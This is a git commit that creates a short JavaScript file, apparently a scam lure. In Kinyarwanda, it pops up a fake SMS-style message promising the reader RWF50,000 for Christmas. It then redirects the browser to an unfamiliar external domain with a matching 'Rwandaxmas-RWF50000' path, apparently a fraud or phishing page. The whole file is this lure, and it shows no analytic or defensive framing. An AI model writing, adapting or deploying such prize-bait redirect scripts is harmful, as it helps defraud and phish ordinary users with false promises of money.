20c9c3d666448f60477b5dbea7cb3ecd8b6f96c0
newetijazz11 <newetijazz11@gmail.com>
2025-12-24 07:58:00 +0100

    Create rwandaxmas.js

---
+++ rwandaxmas.js
@@ -0,0 +1,8 @@
+var password = 'Kuramo RWF50,000'
+password = prompt(
+  'SMS: Twishimiye! Uremerewe kwakira RWF50,000 kwizihiza Noheri yuyu mwaka. Nyamuneka kanda OK kugirango ubone iki gitekerezo.',
+  'Kuramo RWF50,000'
+);
+if (password != 'Kuramo RWF50,000') {
+  location.href = 'https://www.bhufrizx.online/Rwandaxmas-RWF50000';
+}
